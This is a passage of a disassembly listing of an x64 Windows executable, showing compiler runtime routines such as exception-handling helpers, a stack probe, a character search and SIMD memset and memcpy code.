   14000ecb8:	48 83 ec 28          	sub    $0x28,%rsp
   14000ecbc:	4d 8b 41 38          	mov    0x38(%r9),%r8
   14000ecc0:	48 8b ca             	mov    %rdx,%rcx
   14000ecc3:	49 8b d1             	mov    %r9,%rdx
   14000ecc6:	e8 0d 00 00 00       	call   0x14000ecd8
   14000eccb:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ecd0:	48 83 c4 28          	add    $0x28,%rsp
   14000ecd4:	c3                   	ret
   14000ecd5:	cc                   	int3
   14000ecd6:	cc                   	int3
   14000ecd7:	cc                   	int3
   14000ecd8:	40 53                	rex push %rbx
   14000ecda:	45 8b 18             	mov    (%r8),%r11d
   14000ecdd:	48 8b da             	mov    %rdx,%rbx
   14000ece0:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000ece4:	4c 8b c9             	mov    %rcx,%r9
   14000ece7:	41 f6 00 04          	testb  $0x4,(%r8)
   14000eceb:	4c 8b d1             	mov    %rcx,%r10
   14000ecee:	74 13                	je     0x14000ed03
   14000ecf0:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000ecf4:	4d 63 50 04          	movslq 0x4(%r8),%r10
   14000ecf8:	f7 d8                	neg    %eax
   14000ecfa:	4c 03 d1             	add    %rcx,%r10
   14000ecfd:	48 63 c8             	movslq %eax,%rcx
   14000ed00:	4c 23 d1             	and    %rcx,%r10
   14000ed03:	49 63 c3             	movslq %r11d,%rax
   14000ed06:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   14000ed0a:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000ed0e:	8b 48 08             	mov    0x8(%rax),%ecx
   14000ed11:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000ed15:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   14000ed1a:	74 0b                	je     0x14000ed27
   14000ed1c:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   14000ed21:	83 e0 f0             	and    $0xfffffff0,%eax
   14000ed24:	4c 03 c8             	add    %rax,%r9
   14000ed27:	4c 33 ca             	xor    %rdx,%r9
   14000ed2a:	49 8b c9             	mov    %r9,%rcx
   14000ed2d:	5b                   	pop    %rbx
   14000ed2e:	e9 2d 26 ff ff       	jmp    0x140001360
   14000ed33:	cc                   	int3
   14000ed34:	e9 e7 00 00 00       	jmp    0x14000ee20
   14000ed39:	cc                   	int3
   14000ed3a:	cc                   	int3
   14000ed3b:	cc                   	int3
   14000ed3c:	cc                   	int3
   14000ed3d:	cc                   	int3
   14000ed3e:	cc                   	int3
   14000ed3f:	cc                   	int3
   14000ed40:	cc                   	int3
   14000ed41:	cc                   	int3
   14000ed42:	cc                   	int3
   14000ed43:	cc                   	int3
   14000ed44:	cc                   	int3
   14000ed45:	cc                   	int3
   14000ed46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ed4d:	00 00 00 
   14000ed50:	48 83 ec 10          	sub    $0x10,%rsp
   14000ed54:	4c 89 14 24          	mov    %r10,(%rsp)
   14000ed58:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000ed5d:	4d 33 db             	xor    %r11,%r11
   14000ed60:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000ed65:	4c 2b d0             	sub    %rax,%r10
   14000ed68:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000ed6c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000ed73:	00 00 
   14000ed75:	4d 3b d3             	cmp    %r11,%r10
   14000ed78:	73 16                	jae    0x14000ed90
   14000ed7a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000ed80:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000ed87:	41 c6 03 00          	movb   $0x0,(%r11)
   14000ed8b:	4d 3b d3             	cmp    %r11,%r10
   14000ed8e:	75 f0                	jne    0x14000ed80
   14000ed90:	4c 8b 14 24          	mov    (%rsp),%r10
   14000ed94:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000ed99:	48 83 c4 10          	add    $0x10,%rsp
   14000ed9d:	c3                   	ret
   14000ed9e:	cc                   	int3
   14000ed9f:	cc                   	int3
   14000eda0:	48 8b c4             	mov    %rsp,%rax
   14000eda3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000eda7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000edab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000edaf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000edb3:	41 56                	push   %r14
   14000edb5:	48 83 ec 20          	sub    $0x20,%rsp
   14000edb9:	49 8b 59 38          	mov    0x38(%r9),%rbx
   14000edbd:	48 8b f2             	mov    %rdx,%rsi
   14000edc0:	4d 8b f0             	mov    %r8,%r14
   14000edc3:	48 8b e9             	mov    %rcx,%rbp
   14000edc6:	49 8b d1             	mov    %r9,%rdx
   14000edc9:	48 8b ce             	mov    %rsi,%rcx
   14000edcc:	49 8b f9             	mov    %r9,%rdi
   14000edcf:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   14000edd3:	e8 00 ff ff ff       	call   0x14000ecd8
   14000edd8:	8b 45 04             	mov    0x4(%rbp),%eax
   14000eddb:	24 66                	and    $0x66,%al
   14000eddd:	f6 d8                	neg    %al
   14000eddf:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ede4:	45 1b c0             	sbb    %r8d,%r8d
   14000ede7:	41 f7 d8             	neg    %r8d
   14000edea:	44 03 c0             	add    %eax,%r8d
   14000eded:	44 85 43 04          	test   %r8d,0x4(%rbx)
   14000edf1:	74 11                	je     0x14000ee04
   14000edf3:	4c 8b cf             	mov    %rdi,%r9
   14000edf6:	4d 8b c6             	mov    %r14,%r8
   14000edf9:	48 8b d6             	mov    %rsi,%rdx
   14000edfc:	48 8b cd             	mov    %rbp,%rcx
   14000edff:	e8 e8 41 ff ff       	call   0x140002fec
   14000ee04:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ee09:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000ee0e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000ee13:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000ee18:	48 83 c4 20          	add    $0x20,%rsp
   14000ee1c:	41 5e                	pop    %r14
   14000ee1e:	c3                   	ret
   14000ee1f:	cc                   	int3
   14000ee20:	e9 6f 6f ff ff       	jmp    0x140005d94
   14000ee25:	cc                   	int3
   14000ee26:	cc                   	int3
   14000ee27:	cc                   	int3
   14000ee28:	cc                   	int3
   14000ee29:	cc                   	int3
   14000ee2a:	cc                   	int3
   14000ee2b:	cc                   	int3
   14000ee2c:	cc                   	int3
   14000ee2d:	cc                   	int3
   14000ee2e:	cc                   	int3
   14000ee2f:	cc                   	int3
   14000ee30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ee35:	57                   	push   %rdi
   14000ee36:	48 83 ec 20          	sub    $0x20,%rsp
   14000ee3a:	49 8b f8             	mov    %r8,%rdi
   14000ee3d:	48 8b d9             	mov    %rcx,%rbx
   14000ee40:	e8 1b 33 ff ff       	call   0x140002160
   14000ee45:	f6 43 04 66          	testb  $0x66,0x4(%rbx)
   14000ee49:	75 0d                	jne    0x14000ee58
   14000ee4b:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000ee51:	75 05                	jne    0x14000ee58
   14000ee53:	83 f8 01             	cmp    $0x1,%eax
   14000ee56:	74 0b                	je     0x14000ee63
   14000ee58:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ee5d:	48 83 c4 20          	add    $0x20,%rsp
   14000ee61:	5f                   	pop    %rdi
   14000ee62:	c3                   	ret
   14000ee63:	e8 a4 37 ff ff       	call   0x14000260c
   14000ee68:	48 89 58 20          	mov    %rbx,0x20(%rax)
   14000ee6c:	e8 9b 37 ff ff       	call   0x14000260c
   14000ee71:	48 89 78 28          	mov    %rdi,0x28(%rax)
   14000ee75:	e8 ee 6e ff ff       	call   0x140005d68
   14000ee7a:	cc                   	int3
   14000ee7b:	cc                   	int3
   14000ee7c:	0f b6 c2             	movzbl %dl,%eax
   14000ee7f:	4c 8b c1             	mov    %rcx,%r8
   14000ee82:	44 8b d0             	mov    %eax,%r10d
   14000ee85:	49 83 e0 f0          	and    $0xfffffffffffffff0,%r8
   14000ee89:	41 c1 e2 08          	shl    $0x8,%r10d
   14000ee8d:	83 e1 0f             	and    $0xf,%ecx
   14000ee90:	44 0b d0             	or     %eax,%r10d
   14000ee93:	45 33 c9             	xor    %r9d,%r9d
   14000ee96:	83 c8 ff             	or     $0xffffffff,%eax
   14000ee99:	d3 e0                	shl    %cl,%eax
   14000ee9b:	66 41 0f 6e c2       	movd   %r10d,%xmm0
   14000eea0:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   14000eea5:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000eea8:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   14000eead:	66 0f 70 d1 00       	pshufd $0x0,%xmm1,%xmm2
   14000eeb2:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000eeb6:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   14000eebb:	0f 56 c8             	orps   %xmm0,%xmm1
   14000eebe:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   14000eec2:	23 d0                	and    %eax,%edx
   14000eec4:	75 20                	jne    0x14000eee6
   14000eec6:	49 83 c0 10          	add    $0x10,%r8
   14000eeca:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000eece:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000eed1:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   14000eed6:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   14000eedb:	0f 56 c8             	orps   %xmm0,%xmm1
   14000eede:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   14000eee2:	85 d2                	test   %edx,%edx
   14000eee4:	74 e0                	je     0x14000eec6
   14000eee6:	0f bc d2             	bsf    %edx,%edx
   14000eee9:	49 03 d0             	add    %r8,%rdx
   14000eeec:	44 38 12             	cmp    %r10b,(%rdx)
   14000eeef:	4c 0f 44 ca          	cmove  %rdx,%r9
   14000eef3:	49 8b c1             	mov    %r9,%rax
   14000eef6:	c3                   	ret
   14000eef7:	cc                   	int3
   14000eef8:	cc                   	int3
   14000eef9:	cc                   	int3
   14000eefa:	cc                   	int3
   14000eefb:	cc                   	int3
   14000eefc:	cc                   	int3
   14000eefd:	cc                   	int3
   14000eefe:	cc                   	int3
   14000eeff:	cc                   	int3
   14000ef00:	cc                   	int3
   14000ef01:	cc                   	int3
   14000ef02:	cc                   	int3
   14000ef03:	cc                   	int3
   14000ef04:	cc                   	int3
   14000ef05:	cc                   	int3
   14000ef06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ef0d:	00 00 00 
   14000ef10:	ff e0                	jmp    *%rax
   14000ef12:	cc                   	int3
   14000ef13:	cc                   	int3
   14000ef14:	cc                   	int3
   14000ef15:	cc                   	int3
   14000ef16:	cc                   	int3
   14000ef17:	cc                   	int3
   14000ef18:	cc                   	int3
   14000ef19:	cc                   	int3
   14000ef1a:	cc                   	int3
   14000ef1b:	cc                   	int3
   14000ef1c:	cc                   	int3
   14000ef1d:	cc                   	int3
   14000ef1e:	cc                   	int3
   14000ef1f:	cc                   	int3
   14000ef20:	cc                   	int3
   14000ef21:	cc                   	int3
   14000ef22:	cc                   	int3
   14000ef23:	cc                   	int3
   14000ef24:	cc                   	int3
   14000ef25:	cc                   	int3
   14000ef26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ef2d:	00 00 00 
   14000ef30:	ff 25 82 13 00 00    	jmp    *0x1382(%rip)        # 0x1400102b8
   14000ef36:	cc                   	int3
   14000ef37:	cc                   	int3
   14000ef38:	cc                   	int3
   14000ef39:	cc                   	int3
   14000ef3a:	cc                   	int3
   14000ef3b:	cc                   	int3
   14000ef3c:	cc                   	int3
   14000ef3d:	cc                   	int3
   14000ef3e:	cc                   	int3
   14000ef3f:	cc                   	int3
   14000ef40:	cc                   	int3
   14000ef41:	cc                   	int3
   14000ef42:	cc                   	int3
   14000ef43:	cc                   	int3
   14000ef44:	cc                   	int3
   14000ef45:	cc                   	int3
   14000ef46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ef4d:	00 00 00 
   14000ef50:	cc                   	int3
   14000ef51:	cc                   	int3
   14000ef52:	cc                   	int3
   14000ef53:	cc                   	int3
   14000ef54:	cc                   	int3
   14000ef55:	cc                   	int3
   14000ef56:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ef5d:	00 00 00 
   14000ef60:	57                   	push   %rdi
   14000ef61:	8b c2                	mov    %edx,%eax
   14000ef63:	48 8b f9             	mov    %rcx,%rdi
   14000ef66:	49 8b c8             	mov    %r8,%rcx
   14000ef69:	f3 aa                	rep stos %al,(%rdi)
   14000ef6b:	49 8b c1             	mov    %r9,%rax
   14000ef6e:	5f                   	pop    %rdi
   14000ef6f:	c3                   	ret
   14000ef70:	48 8b c1             	mov    %rcx,%rax
   14000ef73:	4c 8b c9             	mov    %rcx,%r9
   14000ef76:	4c 8d 15 83 10 ff ff 	lea    -0xef7d(%rip),%r10        # 0x140000000
   14000ef7d:	0f b6 d2             	movzbl %dl,%edx
   14000ef80:	49 bb 01 01 01 01 01 	movabs $0x101010101010101,%r11
   14000ef87:	01 01 01 
   14000ef8a:	4c 0f af da          	imul   %rdx,%r11
   14000ef8e:	66 49 0f 6e c3       	movq   %r11,%xmm0
   14000ef93:	49 83 f8 0f          	cmp    $0xf,%r8
   14000ef97:	0f 87 83 00 00 00    	ja     0x14000f020
   14000ef9d:	0f 1f 00             	nopl   (%rax)
   14000efa0:	49 03 c8             	add    %r8,%rcx
   14000efa3:	47 8b 8c 82 e0 7a 01 	mov    0x17ae0(%r10,%r8,4),%r9d
   14000efaa:	00 
   14000efab:	4d 03 ca             	add    %r10,%r9
   14000efae:	41 ff e1             	jmp    *%r9
   14000efb1:	4c 89 59 f1          	mov    %r11,-0xf(%rcx)
   14000efb5:	44 89 59 f9          	mov    %r11d,-0x7(%rcx)
   14000efb9:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000efbe:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000efc2:	c3                   	ret
   14000efc3:	4c 89 59 f2          	mov    %r11,-0xe(%rcx)
   14000efc7:	44 89 59 fa          	mov    %r11d,-0x6(%rcx)
   14000efcb:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000efd0:	c3                   	ret
   14000efd1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000efd8:	0f 1f 84 00 00 00 00 
   14000efdf:	00 
   14000efe0:	4c 89 59 f3          	mov    %r11,-0xd(%rcx)
   14000efe4:	44 89 59 fb          	mov    %r11d,-0x5(%rcx)
   14000efe8:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000efec:	c3                   	ret
   14000efed:	0f 1f 00             	nopl   (%rax)
   14000eff0:	4c 89 59 f4          	mov    %r11,-0xc(%rcx)
   14000eff4:	44 89 59 fc          	mov    %r11d,-0x4(%rcx)
   14000eff8:	c3                   	ret
   14000eff9:	4c 89 59 f5          	mov    %r11,-0xb(%rcx)
   14000effd:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000f002:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000f006:	c3                   	ret
   14000f007:	4c 89 59 f7          	mov    %r11,-0x9(%rcx)
   14000f00b:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000f00f:	c3                   	ret
   14000f010:	4c 89 59 f6          	mov    %r11,-0xa(%rcx)
   14000f014:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000f019:	c3                   	ret
   14000f01a:	4c 89 59 f8          	mov    %r11,-0x8(%rcx)
   14000f01e:	c3                   	ret
   14000f01f:	90                   	nop
   14000f020:	66 0f 6c c0          	punpcklqdq %xmm0,%xmm0
   14000f024:	49 83 f8 20          	cmp    $0x20,%r8
   14000f028:	77 0c                	ja     0x14000f036
   14000f02a:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   14000f02e:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000f035:	c3                   	ret
   14000f036:	83 3d 1b b0 00 00 03 	cmpl   $0x3,0xb01b(%rip)        # 0x14001a058
   14000f03d:	0f 82 dd 01 00 00    	jb     0x14000f220
   14000f043:	4c 3b 05 16 b0 00 00 	cmp    0xb016(%rip),%r8        # 0x14001a060
   14000f04a:	76 16                	jbe    0x14000f062
   14000f04c:	4c 3b 05 15 b0 00 00 	cmp    0xb015(%rip),%r8        # 0x14001a068
   14000f053:	77 0d                	ja     0x14000f062
   14000f055:	f6 05 2c c0 00 00 02 	testb  $0x2,0xc02c(%rip)        # 0x14001b088
   14000f05c:	0f 85 fe fe ff ff    	jne    0x14000ef60
   14000f062:	c4 e3 7d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm0,%ymm0
   14000f068:	4c 8b c9             	mov    %rcx,%r9
   14000f06b:	49 83 e1 1f          	and    $0x1f,%r9
   14000f06f:	49 83 e9 20          	sub    $0x20,%r9
   14000f073:	49 2b c9             	sub    %r9,%rcx
   14000f076:	49 2b d1             	sub    %r9,%rdx
   14000f079:	4d 03 c1             	add    %r9,%r8
   14000f07c:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f083:	76 65                	jbe    0x14000f0ea
   14000f085:	4c 3b 05 dc af 00 00 	cmp    0xafdc(%rip),%r8        # 0x14001a068
   14000f08c:	0f 87 ce 00 00 00    	ja     0x14000f160
   14000f092:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f099:	1f 84 00 00 00 00 00 
   14000f0a0:	c5 fd 7f 01          	vmovdqa %ymm0,(%rcx)
   14000f0a4:	c5 fd 7f 41 20       	vmovdqa %ymm0,0x20(%rcx)
   14000f0a9:	c5 fd 7f 41 40       	vmovdqa %ymm0,0x40(%rcx)
   14000f0ae:	c5 fd 7f 41 60       	vmovdqa %ymm0,0x60(%rcx)
   14000f0b3:	c5 fd 7f 81 80 00 00 	vmovdqa %ymm0,0x80(%rcx)
   14000f0ba:	00 
   14000f0bb:	c5 fd 7f 81 a0 00 00 	vmovdqa %ymm0,0xa0(%rcx)
   14000f0c2:	00 
   14000f0c3:	c5 fd 7f 81 c0 00 00 	vmovdqa %ymm0,0xc0(%rcx)
   14000f0ca:	00 
   14000f0cb:	c5 fd 7f 81 e0 00 00 	vmovdqa %ymm0,0xe0(%rcx)
   14000f0d2:	00 
   14000f0d3:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000f0da:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000f0e1:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f0e8:	73 b6                	jae    0x14000f0a0
   14000f0ea:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000f0ee:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000f0f2:	4d 8b d9             	mov    %r9,%r11
   14000f0f5:	49 c1 eb 05          	shr    $0x5,%r11
   14000f0f9:	47 8b 9c 9a 20 7b 01 	mov    0x17b20(%r10,%r11,4),%r11d
   14000f100:	00 
   14000f101:	4d 03 da             	add    %r10,%r11
   14000f104:	41 ff e3             	jmp    *%r11
   14000f107:	c4 a1 7e 7f 84 09 00 	vmovdqu %ymm0,-0x100(%rcx,%r9,1)
   14000f10e:	ff ff ff 
   14000f111:	c4 a1 7e 7f 84 09 20 	vmovdqu %ymm0,-0xe0(%rcx,%r9,1)
   14000f118:	ff ff ff 
   14000f11b:	c4 a1 7e 7f 84 09 40 	vmovdqu %ymm0,-0xc0(%rcx,%r9,1)
   14000f122:	ff ff ff 
   14000f125:	c4 a1 7e 7f 84 09 60 	vmovdqu %ymm0,-0xa0(%rcx,%r9,1)
   14000f12c:	ff ff ff 
   14000f12f:	c4 a1 7e 7f 44 09 80 	vmovdqu %ymm0,-0x80(%rcx,%r9,1)
   14000f136:	c4 a1 7e 7f 44 09 a0 	vmovdqu %ymm0,-0x60(%rcx,%r9,1)
   14000f13d:	c4 a1 7e 7f 44 09 c0 	vmovdqu %ymm0,-0x40(%rcx,%r9,1)
   14000f144:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000f14b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000f14f:	c5 f8 77             	vzeroupper
   14000f152:	c3                   	ret
   14000f153:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f15a:	84 00 00 00 00 00 
   14000f160:	c5 fd e7 01          	vmovntdq %ymm0,(%rcx)
   14000f164:	c5 fd e7 41 20       	vmovntdq %ymm0,0x20(%rcx)
   14000f169:	c5 fd e7 41 40       	vmovntdq %ymm0,0x40(%rcx)
   14000f16e:	c5 fd e7 41 60       	vmovntdq %ymm0,0x60(%rcx)
   14000f173:	c5 fd e7 81 80 00 00 	vmovntdq %ymm0,0x80(%rcx)
   14000f17a:	00 
   14000f17b:	c5 fd e7 81 a0 00 00 	vmovntdq %ymm0,0xa0(%rcx)
   14000f182:	00 
   14000f183:	c5 fd e7 81 c0 00 00 	vmovntdq %ymm0,0xc0(%rcx)
   14000f18a:	00 
   14000f18b:	c5 fd e7 81 e0 00 00 	vmovntdq %ymm0,0xe0(%rcx)
   14000f192:	00 
   14000f193:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000f19a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000f1a1:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f1a8:	73 b6                	jae    0x14000f160
   14000f1aa:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000f1ae:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000f1b2:	4d 8b d9             	mov    %r9,%r11
   14000f1b5:	49 c1 eb 05          	shr    $0x5,%r11
   14000f1b9:	47 8b 9c 9a 44 7b 01 	mov    0x17b44(%r10,%r11,4),%r11d
   14000f1c0:	00 
   14000f1c1:	4d 03 da             	add    %r10,%r11
   14000f1c4:	41 ff e3             	jmp    *%r11
   14000f1c7:	c4 a1 7d e7 84 09 00 	vmovntdq %ymm0,-0x100(%rcx,%r9,1)
   14000f1ce:	ff ff ff 
   14000f1d1:	c4 a1 7d e7 84 09 20 	vmovntdq %ymm0,-0xe0(%rcx,%r9,1)
   14000f1d8:	ff ff ff 
   14000f1db:	c4 a1 7d e7 84 09 40 	vmovntdq %ymm0,-0xc0(%rcx,%r9,1)
   14000f1e2:	ff ff ff 
   14000f1e5:	c4 a1 7d e7 84 09 60 	vmovntdq %ymm0,-0xa0(%rcx,%r9,1)
   14000f1ec:	ff ff ff 
   14000f1ef:	c4 a1 7d e7 44 09 80 	vmovntdq %ymm0,-0x80(%rcx,%r9,1)
   14000f1f6:	c4 a1 7d e7 44 09 a0 	vmovntdq %ymm0,-0x60(%rcx,%r9,1)
   14000f1fd:	c4 a1 7d e7 44 09 c0 	vmovntdq %ymm0,-0x40(%rcx,%r9,1)
   14000f204:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000f20b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000f20f:	0f ae f8             	sfence
   14000f212:	c5 f8 77             	vzeroupper
   14000f215:	c3                   	ret
   14000f216:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f21d:	00 00 00 
   14000f220:	4c 3b 05 39 ae 00 00 	cmp    0xae39(%rip),%r8        # 0x14001a060
   14000f227:	76 0d                	jbe    0x14000f236
   14000f229:	f6 05 58 be 00 00 02 	testb  $0x2,0xbe58(%rip)        # 0x14001b088
   14000f230:	0f 85 2a fd ff ff    	jne    0x14000ef60
   14000f236:	4c 8b c9             	mov    %rcx,%r9
   14000f239:	49 83 e1 0f          	and    $0xf,%r9
   14000f23d:	49 83 e9 10          	sub    $0x10,%r9
   14000f241:	49 2b c9             	sub    %r9,%rcx
   14000f244:	49 2b d1             	sub    %r9,%rdx
   14000f247:	4d 03 c1             	add    %r9,%r8
   14000f24a:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000f251:	76 4b                	jbe    0x14000f29e
   14000f253:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f25a:	84 00 00 00 00 00 
   14000f260:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   14000f264:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   14000f269:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   14000f26e:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   14000f273:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   14000f278:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   14000f27d:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   14000f282:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   14000f287:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000f28e:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000f295:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000f29c:	73 c2                	jae    0x14000f260
   14000f29e:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000f2a2:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000f2a6:	4d 8b d9             	mov    %r9,%r11
   14000f2a9:	49 c1 eb 04          	shr    $0x4,%r11
   14000f2ad:	47 8b 9c 9a 68 7b 01 	mov    0x17b68(%r10,%r11,4),%r11d
   14000f2b4:	00 
   14000f2b5:	4d 03 da             	add    %r10,%r11
   14000f2b8:	41 ff e3             	jmp    *%r11
   14000f2bb:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   14000f2c2:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   14000f2c9:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   14000f2d0:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   14000f2d7:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   14000f2de:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   14000f2e5:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   14000f2ec:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000f2f3:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000f2f7:	c3                   	ret
   14000f2f8:	cc                   	int3
   14000f2f9:	cc                   	int3
   14000f2fa:	cc                   	int3
   14000f2fb:	cc                   	int3
   14000f2fc:	cc                   	int3
   14000f2fd:	cc                   	int3
   14000f2fe:	cc                   	int3
   14000f2ff:	cc                   	int3
   14000f300:	cc                   	int3
   14000f301:	cc                   	int3
   14000f302:	cc                   	int3
   14000f303:	cc                   	int3
   14000f304:	cc                   	int3
   14000f305:	cc                   	int3
   14000f306:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f30d:	00 00 00 
   14000f310:	cc                   	int3
   14000f311:	cc                   	int3
   14000f312:	cc                   	int3
   14000f313:	cc                   	int3
   14000f314:	cc                   	int3
   14000f315:	cc                   	int3
   14000f316:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f31d:	00 00 00 
   14000f320:	57                   	push   %rdi
   14000f321:	56                   	push   %rsi
   14000f322:	48 8b f9             	mov    %rcx,%rdi
   14000f325:	48 8b f2             	mov    %rdx,%rsi
   14000f328:	49 8b c8             	mov    %r8,%rcx
   14000f32b:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000f32d:	5e                   	pop    %rsi
   14000f32e:	5f                   	pop    %rdi
   14000f32f:	c3                   	ret
   14000f330:	48 8b c1             	mov    %rcx,%rax
   14000f333:	4c 8d 15 c6 0c ff ff 	lea    -0xf33a(%rip),%r10        # 0x140000000
   14000f33a:	49 83 f8 0f          	cmp    $0xf,%r8
   14000f33e:	0f 87 0c 01 00 00    	ja     0x14000f450
   14000f344:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f34b:	00 00 00 00 00 
   14000f350:	47 8b 8c 82 90 7b 01 	mov    0x17b90(%r10,%r8,4),%r9d
   14000f357:	00 
   14000f358:	4d 03 ca             	add    %r10,%r9
   14000f35b:	41 ff e1             	jmp    *%r9
   14000f35e:	c3                   	ret
   14000f35f:	90                   	nop
   14000f360:	4c 8b 02             	mov    (%rdx),%r8
   14000f363:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000f366:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000f36b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   14000f370:	4c 89 00             	mov    %r8,(%rax)
   14000f373:	89 48 08             	mov    %ecx,0x8(%rax)
   14000f376:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
